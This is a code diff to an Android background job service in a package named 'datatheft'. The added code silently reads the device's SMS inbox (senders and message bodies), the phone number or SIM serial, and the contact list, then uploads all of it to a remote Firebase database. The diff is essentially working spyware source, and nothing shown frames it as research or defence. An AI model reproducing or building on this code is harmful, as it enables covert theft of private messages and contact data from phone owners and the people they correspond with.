@@ -3,8 +3,9 @@ package nerdcastle.datatheft;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
-import android.os.AsyncTask;
-import android.os.Handler;
+import android.net.Uri;
+import android.os.*;
+import android.os.Message;
 import android.provider.ContactsContract;
 import android.telephony.TelephonyManager;
 import android.util.Log;
@@ -25,6 +26,8 @@ import java.util.Date;
 
 public class InfoJobService extends JobService {
     private ArrayList<Contact> contactList;
+    private String mPhoneNumber="";
+    private ArrayList<PhoneMessage> messages;
 
     @Override
     public boolean onStartJob(final JobParameters job) {
@@ -34,7 +37,6 @@ public class InfoJobService extends JobService {
                 uploadDatToFirebase(job);
             }
         }).start();
-
         return true;
     }
 
@@ -47,21 +49,50 @@ public class InfoJobService extends JobService {
 
     private void uploadDatToFirebase(final JobParameters parameters) {
         try{
-            TelephonyManager tMgr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
-            String mPhoneNumber = tMgr.getLine1Number();
-            contactList=getContactList();
-            Info info=new Info(mPhoneNumber,contactList);
-            FirebaseDatabase database = FirebaseDatabase.getInstance();
-            DatabaseReference myRef = database.getReference("info");
-            String pushKey=myRef.push().getKey();
-            myRef.child(pushKey).setValue(info);
-            Thread.sleep(2000);
+            getSms();
+            Thread.sleep(5000);
         }catch (InterruptedException e) {
             e.printStackTrace();
         } finally {
             //Tell the framework that the job has completed and doesnot needs to be reschedule
             jobFinished(parameters, true);
         }
+    }
+
+    private void getUSerPhoneNumber() {
+        TelephonyManager tMgr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+        mPhoneNumber = tMgr.getLine1Number();
+        if(mPhoneNumber.length()==0){
+            mPhoneNumber= tMgr.getSimSerialNumber();
+        }
+    }
+
+    private void firebaseDataPass() {
+        Info info=new Info(mPhoneNumber,contactList,messages);
+        FirebaseDatabase database = FirebaseDatabase.getInstance();
+        DatabaseReference myRef = database.getReference("info");
+        String pushKey=myRef.push().getKey();
+        myRef.child(pushKey).setValue(info);
+    }
+
+    private void getSms() {
+        messages=new ArrayList<>();
+        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+        if (cursor.moveToFirst()) { // must check the result to prevent exception
+            do {
+                    String from=cursor.getString(cursor.getColumnIndex("address"));
+                    String msg=cursor.getString(cursor.getColumnIndex("body"));
+                    PhoneMessage phoneMessage=new PhoneMessage(from,msg);
+                    messages.add(phoneMessage);
+                // use msgData
+            } while (cursor.moveToNext());
+        } else {
+            // empty box, no SMS
+        }
+        cursor.close();
+        getUSerPhoneNumber();
+        contactList=getContactList();
+        firebaseDataPass();
     }
 
     private ArrayList<Contact> getContactList() {
